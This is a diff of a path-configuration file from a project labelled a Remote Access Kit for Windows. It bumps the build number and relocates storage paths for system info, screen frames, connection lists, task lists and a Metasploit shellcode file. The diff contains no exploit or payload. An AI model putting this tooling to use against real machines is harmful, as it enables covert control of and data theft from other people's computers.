@@ -10,7 +10,7 @@
 #             [A Remote Access Kit for Windows]
 # Author: SlizBinksman
 # Github: https://github.com/slizbinksman
-# Build:  1.0.21
+# Build:  1.0.22
 # -------------------------------------------------------------
 import os
 
@@ -34,15 +34,14 @@ class LoggingUtilitys:
 #Data storage file paths
 class DSFilePath:
     def __init__(self):
-        self.sys_info_file = LoggingUtilitys().get_misc_file_path_str('data_storage/sysinfo_window/sysinfo.txt')
+        self.sys_info_file = LoggingUtilitys().get_misc_file_path_str('data_storage/sysinfo.txt')
         self.streaming_frame = LoggingUtilitys().get_misc_file_path_str('data_storage/frame.jpg')
         self.console_output_file = LoggingUtilitys().get_misc_file_path_str('data_storage/console_window/console_output.txt')
         self.active_connections_file = LoggingUtilitys().get_misc_file_path_str('data_storage/console_window/active_connections.txt')
         self.bits_file = LoggingUtilitys().get_misc_file_path_str('data_storage/console_window/bits.txt')
         self.listening_sockets_file = LoggingUtilitys().get_misc_file_path_str('data_storage/console_window/listening.txt')
-        self.task_manager_file = LoggingUtilitys().get_misc_file_path_str('data_storage/sysinfo_window/task_list.txt')
-        self.task_manager_csv = LoggingUtilitys().get_misc_file_path_str('data_storage/sysinfo_window/task_list.csv')
-        self.job_file = LoggingUtilitys().get_misc_file_path_str('data_storage/sysinfo_window/job.txt')
+        self.task_manager_file = LoggingUtilitys().get_misc_file_path_str('data_storage/task_list.txt')
+        self.job_file = LoggingUtilitys().get_misc_file_path_str('data_storage/job.txt')
         self.msf_shellcode_file = LoggingUtilitys().get_misc_file_path_str('data_storage/shellcode.txt')
 
 #Config file paths
